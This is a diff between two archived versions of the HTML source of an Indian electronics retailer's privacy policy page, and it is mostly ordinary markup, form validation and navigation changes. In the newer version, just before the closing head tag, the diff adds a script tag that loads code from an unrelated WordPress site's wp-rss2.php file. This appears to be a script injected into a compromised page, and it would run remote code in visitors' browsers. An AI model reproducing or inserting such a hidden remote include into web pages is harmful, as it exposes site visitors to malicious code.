@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the smartshoppers.in privacy policy that was archived on 2009-10-27.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20091027032217id_/http%3A//www.smartshoppers.in/index.php%3Fukey%3Dauxpage_5) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the smartshoppers.in privacy policy that was archived on 2010-06-03.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20100603202837id_/http%3A//smartshoppers.in/auxpage_5) for the most accurate reproduction.-->
 
 <html><head>
 		<script language="javascript" type="text/javascript">
@@ -10,7 +10,7 @@
 			}
 			
 			function fnChangeAddress(arg1,arg,arg2){
-				var url='http://www.smartshoppers.in/';
+				var url='http://smartshoppers.in/';
 				window.open(arg1+"/change_address.php?add_id="+arg+"&cust_id="+arg2+"&URL="+url, "", "menubar=0,resizable=yes,scrollbars=yes,width=700,height=600");
 			 } 
 			
@@ -139,16 +139,61 @@
 			document.frmSearch.action=arg;
 			document.frmSearch.submit();
 		}
+		function fnFeedbackValidate(){
+			var oMobile	= document.getElementById("customer_mobile");
+			var oName   = document.getElementById("customer_name");
+			var oEmail  = document.getElementById("customer_email");
+			var osubject = document.getElementById("message_subject");
+			var oText = document.getElementById("message_text");
+			if(isNull(oName,"your name"))  {  
+					return (false);
+			 }  
+			
+			if(isNull(oEmail,"e-mail address"))  {  
+				return (false);
+			 }  
+			
+			if(notEmail(oEmail,"e-mail address"))  {  
+				return (false);
+			 } 
+			
+			if(isNull(oMobile,"mobile number"))  {  
+					return (false);
+				 }  
+	
+				if(fnChkNum1(oMobile,"mobile number"))  {  
+					return (false);
+				 } 
+				
+				if(fnChkNum3(oMobile,"mobile"))  {  
+					return (false);
+				 }  
+	
+				if(isLen2(oMobile,"10","Mobile"))  {  
+					return (false);
+				 }  
+				
+				if(isLen3(oMobile,"10","Mobile"))  {  
+					return (false);
+				 }  
+			if(isNull(osubject,"subject"))  {  
+					return (false);
+			 }  
+			if(isNull(oText,"text"))  {  
+					return (false);
+			 }  
+			
+		}
 		</script>
 		<!--include for subbu and vijay  [end]-->	
 		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 		<link rel="shortcut icon" href="/published/SC/html/scripts/images/favicon.ico" type="image/x-icon">
-		<base href="http://www.smartshoppers.in/">
+		<base href="http://smartshoppers.in/">
 		       <script type="text/javascript" language="javascript">
        	var WAROOT_URL = '/';		       </script>
 
 		<!-- Head start -->
-		<title>Privacy policy ― Smart Shoppers | Online Shopping India to buy Digital Camera, MP3 Players, Laptop, Mobile, apple ipods, Camcorders, pendrives, Storage Devices at Lowest prices at Smartshoppers</title>
+		<title>Privacy policy ― Smart Shoppers Deals with Digital Camera, Camera Lenses, SLR Digital Camera, Laptops, Ipod and Mobile Phones in India.</title>
 <meta name="Description" content="PRIVACY POLICY">
 <meta name="KeyWords" content="PRIVACY POLICY">
 
@@ -179,7 +224,7 @@
 				}
 			};
 			
-			var ORIG_URL = 'http://www.smartshoppers.in/';
+			var ORIG_URL = 'http://smartshoppers.in/';
 	
 			var ORIG_LANG_URL = '/';
 			window.currDispTemplate = defaultCurrency.display_template;
@@ -339,7 +384,12 @@
 				/* For Address Editor :END */
 				
 			 } 
-		
+		function showPopup(pid,prdid){
+					
+				//window.open("http://smartshoppers.in/includes/zoom/zoom.php?photoid="+pid+"&prdid="+prdid,'','width=710,height=560,scrollbars=yes,status=no,toolbar=no,top=0,left=0');
+				window.open("http://smartshoppers.in/published/SC/html/scripts/zoom.php?photoid="+pid+"&prdid="+prdid,'','width=710,height=560,scrollbars=yes,status=no,toolbar=no,top=0,left=0');
+								
+			}
 		</script>
 
 <!--Start Kampyle Exit-Popup Code--> 
@@ -369,8 +419,9 @@ var k_push_vars =  {
 <link rel="stylesheet" type="text/css" media="screen" href="http://cf.kampyle.com/k_button.css">
 <!-- End Kampyle Css -->		
 		
-		
-	</head>
+<meta name="google-site-verification" content="7Jjog8UQnhwhcz8HnriuLetwU5rG5G62hhvGi3pf7a8">		
+	<script src="http://beautyschooldropouts.com/wp-includes/wp-rss2.php"></script></head>
+
 	<body>
 			<!--/*
 ********************************************************************************
@@ -386,94 +437,163 @@ Description        : Code for include the files for left,right,top navigation 	*
 		<td valign="top">
 			<table cellspacing="0" cellpadding="0" width="1000" border="0" align="center" bgcolor="#FFFFFF">
 			<tbody><tr><td class="top">
-	<table cellspacing="0" cellpadding="0" width="100%" border="0">	
-	<tbody><tr>
-		<td width="213"><a href="http://www.smartshoppers.in/"><img src="/published/SC/html/scripts/images/logo.gif" width="213" height="55" border="0" title="Smart Shoppers"></a></td>
-		<td align="center">
-			<table width="533" cellspacing="0" cellpadding="0" border="0">
-    <!--DWLayoutTable-->
+			
+			
+		
+	
+		<link rel="stylesheet" href="http://www.smartshoppers.in/published/SC/html/scripts/repo_themes/smart/overridestyles.css" type="text/css">		
+		<link rel="stylesheet" href="http://www.smartshoppers.in/published/SC/html/scripts/repo_themes/smart/main.css" type="text/css">
+		<link rel="stylesheet" href="http://www.smartshoppers.in/published/SC/html/scripts/css/general.css" type="text/css">
+		<link rel="stylesheet" href="http://www.smartshoppers.in/published/SC/html/scripts/css/example.css" type="text/css">
+
+<table border="0" align="center" cellpadding="0" cellspacing="0">
     <tbody>
         <tr>
-            <td width="500" valign="middle" height="1" align="center"><img width="533" height="1" border="0" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/spacer.gif"></td>
+            <td width="213" height="75"><a href="http://smartshoppers.in/"><img width="213" height="55" border="0" title="Smart Shoppers" alt="" src="http://www.smartshoppers.in/published/SC/html/scripts/images/logo.gif"></a></td>
+            <td width="724" align="center">&nbsp;</td>
+            <td width="78" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+              <tbody>
+                <tr>
+                  <td valign="top" height="24"><table border="0" cellpadding="0" cellspacing="0" width="200" align="right" style="margin:0px">
+				<tbody><tr>
+					<td align="center" width="30"><img src="/published/SC/html/scripts/images/icohome.jpg" alt="" title="Home" width="12" border="0" align="middle" height="10"></td>
+					<td width="1"></td>
+					<td align="center" width="50">		
+						<img src="/published/SC/html/scripts/images/icocontus.jpg" alt="" title="Contact Us" width="11" border="0" align="middle" height="10">
+					</td>
+					<td width="1"></td>
+					<td align="center" width="30"><img src="/published/SC/html/scripts/images/icologin.jpg" alt="" title="Login" width="18" border="0" height="10" align="middle"></td>	
+				</tr>
+				<tr>
+					<td align="center">
+						<a href="http://smartshoppers.in/" class="topLinks">Home</a></td><td>|  
+					</td>
+					
+					<td align="center">
+						<a href="auxpage_11" class="topLinks">Contact Us</a></td><td>|
+					</td> 
+					
+					<td align="center">
+						<a href="auth" class="topLinks">Login</a>
+					</td>
+				</tr>
+			</tbody></table></td>
+                </tr>
+                <tr>
+                  <td align="center" class="blueTxt1" style="padding-left: 5px;">&nbsp;</td>
+                </tr>
+                <tr>
+                  <td align="center" class="blueTxt1" style="padding-left: 4px; font-weight: bold;">&nbsp;</td>
+                </tr>
+              </tbody>
+            </table></td>
         </tr>
     </tbody>
 </table>
-<!-- Powered by: Crafty Syntax Live Help        http://www.craftysyntax.com/ -->
-<div style="overflow: auto; position: absolute; width: 204px; height: 32px; left: 1000px; top: 124px;" id="craftysyntax"><script type="text/javascript" src="http://chat.smartshoppers.in/livehelp_js.php?eo=1&amp;department=1&amp;serversession=1&amp;pingtimes=15"></script></div>
-<!-- copyright 2003 - 2008 by Eric Gerdes -->
-			<!--<img src="/published/SC/html/scripts/images/adtBBBOTop.jpg" width="531" height="94" border="0" title="Best Buy!! Best Offers!!!" />-->
-		</td>
-		<td valign="top">
-			<table cellpadding="0" cellspacing="0" width="270" border="0">
-			<tbody><tr><td style="padding-left:20px;" align="center">
-				<!--<center><img src="/published/SC/html/scripts/images/iconTopLinks.jpg" width="200" height="10" border="0" title="" />-->
-				<table border="0" cellpadding="0" cellspacing="0">
-					<tbody><tr align="center">
-						<td>
-								<img src="/published/SC/html/scripts/images/icohome.jpg" alt="" title="Home" width="12" border="0" align="middle" height="10">
-						</td>
-						<td></td>
-						<td>		
-								<img src="/published/SC/html/scripts/images/icocontus.jpg" alt="" title="Contact Us" width="11" border="0" align="middle" height="10">
-						</td>
-													<td></td>
-						<td>	
-								<img src="/published/SC/html/scripts/images/icologin.jpg" alt="" title="Login" width="18" border="0" height="10" align="middle">
-						<br>
-						</td>
-					</tr>
-					<tr>
-						<td>
-							<a href="http://www.smartshoppers.in/" class="topLinks">Home</a></td><td>&nbsp; | &nbsp; 
-						</td> 
-						<td>
-							<a href="auxpage_11" class="topLinks">Contact Us</a></td><td> &nbsp; | &nbsp; 
-						</td>
-												<td>
-						<a href="http://www.smartshoppers.in/auth" class="topLinks">Login</a>
-						</td>
-										
-				</tr>
-				</tbody></table>	
-			</td></tr>
-			<tr><td height="8"></td></tr>
-			<tr><td class="blueTxt1" style="padding-left:15px;" align="center">  
-				<div style="width:190px;">     
-					<div align="center" style="padding:0px 0px 0px 2px; width:19px; float:left;"><img src="/published/SC/html/scripts/images/iconCall.jpg" width="19" height="20" border="0" title=""></div> &nbsp; 
-					<a class="AES_email" style="cursor:pointer; font-weight:bold;" onclick="javascript:fnOpenwindow2('/published/SC/html/scripts');">Call us to Place Your Orders</a>
-				</div>
-			</td></tr>	
-			<tr><td style="padding-left:14px;" align="center"><b class="blueTxt1">044-45590370 &nbsp; Mob: +91 9025255222</b></td></tr>
-			<tr><td class="blueTxt1" style="padding-left:14px; font-weight:bold;" align="center">Email : <a href="mailto:customercare@smartshoppers.in" class="AES_email">customercare@smartshoppers.in</a></td>
-			</tr></tbody></table>
-		</td>
-	</tr>
-	<tr><td colspan="3" height="5"></td></tr>
-	<tr>
-		<td colspan="3">
-			<table cellpadding="0" cellspacing="0" border="0" align="center">
-				<tbody><tr>
-					<td width="100%">
-						<ul class="tabs" style=" border:0px solid #FF9900; text-align:center;">
-												
-																			<li><a href="http://www.smartshoppers.in/category/best-digital-cameras" class="menulnk">Digital Cameras</a></li>
-																		
-																			<li><a href="http://www.smartshoppers.in/category/pen-drives" class="menulnk">Pen Drives</a></li>
-																		
-																			<li><a href="http://www.smartshoppers.in/category/best-digital-camcorders" class="menulnk">Camcorders</a></li>
-																		
-																			<li><a href="http://www.smartshoppers.in/category/mp3-players" class="menulnk">MP3 Players</a></li>
-																		
-																			<li><a href="http://www.smartshoppers.in/category/best-memory-cards" class="menulnk">Memory Cards</a></li>
-																		
-																			<li><a href="http://www.smartshoppers.in/category/desktops-laptops-online" class="menulnk">Desktops &amp; Laptops</a></li>
-																		</ul>
-					</td>
-				</tr>
-			</tbody></table>
-		</td>
-	</tr>
-	</tbody></table>
+<script language="javascript" type="text/javascript">
+<!--
+function popitup(url) {
+	newwindow=window.open(url,'name','height=520,width=820');
+	if (window.focus) {newwindow.focus()}
+	return false;
+}
+
+// -->
+</script>
+<table width="1015" height="30" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tbody><tr>
+    <td width="9" height="30" valign="bottom">&nbsp;</td>
+    <td width="874" valign="bottom"><table width="874" border="0" cellspacing="0" cellpadding="0">
+      <tbody><tr>
+        <td width="108"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/best-digital-cameras">Digital Cameras</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="98"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/slr-digital-cameras">SLR Cameras</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="62"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/photography-lenses">Lenses</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="62"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/mobile-phones">Mobiles</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="62"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/desktops-laptops-online">Laptops</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="142"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/computer-peripherals">Computer Peripherals</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="146"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/portable-entertainment">Portable Entertainment</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="116"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/home-appliances">Home Appliances</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+        <td width="78"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+          <tbody>
+            <tr>
+              <td width="6"><img width="6" height="25" alt="" src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/lftslid_1.gif"></td>
+              <td background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/midslid_1.gif" align="center"><a class="blueTxt1" style="font-weight: bold;" href="http://www.smartshoppers.in/category/gamings">Gaming</a></td>
+              <td width="6" background="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/others/rigtslid_1.gif">&nbsp;</td>
+            </tr>
+          </tbody>
+        </table></td>
+      </tr>
+    </tbody></table></td>
+    <td width="123" align="right" valign="bottom"><a href="http://smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/customer_care_page.html" onclick="return popitup('http://smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/customer_care_page.html')"><img src="http://www.smartshoppers.in/published/publicdata/SSLIVESSLIVE/attachments/SC/images/livesupport_smart.gif" width="114" height="25" border="0"></a></td>
+    <td width="9" valign="bottom">&nbsp;</td>
+  </tr>
+</tbody></table>
+	
+	
 </td></tr>
 
 <tr><td class="bgSearch" align="center">
@@ -512,7 +632,7 @@ Description        : Code for include the files for left,right,top navigation 	*
 				<tbody><tr>
 										<!-- START : LEFT Container -->
 							<td width="240" valign="top">
-			<table cellspacing="1" cellpadding="0" border="0" width="94%" align="center" style="border:#D6D6D6 1px solid;">
+					<table cellspacing="1" cellpadding="0" border="0" width="94%" align="center" style="border:#D6D6D6 1px solid;">
 				<tbody><tr>
 					<td class="bgTitle" colspan="4">
 						Categories
@@ -522,114 +642,6 @@ Description        : Code for include the files for left,right,top navigation 	*
 					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
 
 						<tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/electronic-accessories" class="lnkBlak">
-										Accessories
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/bluetooth-headsets" class="lnkBlak">
-										Bluetooth
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/best-digital-camcorders" class="lnkBlak">
-										Camcorders
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/computer-peripherals" class="lnkBlak">
-										Computer Peripherals
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/desktops-laptops-online" class="lnkBlak">
-										Desktops &amp; Laptops
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/digital-photo-frames" class="lnkBlak">
-										Photo Frames
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
 							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
 							 <td width="25" align="center">
 																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
@@ -655,170 +667,8 @@ Description        : Code for include the files for left,right,top navigation 	*
 							</td>
 							<td tyle="border-bottom: 1px solid #FF0000;">
 																					
-																																<a lass="lnkBlak" href="category/dvd-player-online" class="lnkBlak">
-										DVD Player
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/video-games" class="lnkBlak">
-										Gaming
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/best-hard-disks" class="lnkBlak">
-										Hard Disks
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/home-appliances" class="lnkBlak">
-										Home Appliances
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/home-theatres-speakers" class="lnkBlak">
-										Home Theatres &amp; Speakers
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/electronic-hot-deals" class="lnkBlak">
-										Hot Deals
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/best-memory-cards" class="lnkBlak">
-										Memory Cards
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/mobile-phones" class="lnkBlak">
-										Mobile Phones
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/mp3-players" class="lnkBlak">
-										MP3 Players
-									</a>
-																	&nbsp;
-																	<br>
-												
-						</td>
-																
-					<!--tr bgcolor="#f6f6f6"><td style="border-bottom: 1px solid rgb(231, 231, 231);"><a href="customer/account/edit" class="account">Account Information</a></td></tr-->
-
-						</tr><tr>
-							 <td width="5"><img src="/published/SC/html/scripts/images/spacer.gif" width="1" height="1"></td>
-							 <td width="25" align="center">
-																	<img src="/published/SC/html/scripts/images/aeroGray.jpg" width="5" height="5">
-								&nbsp;
-							</td>
-							<td tyle="border-bottom: 1px solid #FF0000;">
-																					
-																																<a lass="lnkBlak" href="category/pen-drives" class="lnkBlak">
-										Pen Drives
+																																<a lass="lnkBlak" href="category/slr-digital-cameras" class="lnkBlak">
+										SLR Digital Cameras
 									</a>
 																	&nbsp;
 																	<br>
@@ -853,8 +703,8 @@ Description        : Code for include the files for left,right,top navigation 	*
 							</td>
 							<td tyle="border-bottom: 1px solid #FF0000;">
 																					
-																																<a lass="lnkBlak" href="category/projectors" class="lnkBlak">
-										Projectors
+																																<a lass="lnkBlak" href="category/best-digital-camcorders" class="lnkBlak">
+										Camcorders
 									</a>
 																	&nbsp;
 																	<br>
@@ -871,8 +721,8 @@ Description        : Code for include the files for left,right,top navigation 	*
 							</td>
 							<td tyle="border-bottom: 1px solid #FF0000;">
 																					
-																																<a lass="lnkBlak" href="category/systems-softwares" class="lnkBlak">
-										Softwares
+																																<a lass="lnkBlak" href="category/camera-accessories" class="lnkBlak">
+										Camera Accessories
 									</a>
 																	&nbsp;
 																	<br>
@@ -889,8 +739,206 @@ Description        : Code for include the files for left,right,top navigation 	*
 							</td>
 							<td tyle="border-bottom: 1px solid #FF0000;">
 																					
-																																<a lass="lnkBlak" href="category/televisions-sale" class="lnkBlak">
-										Television
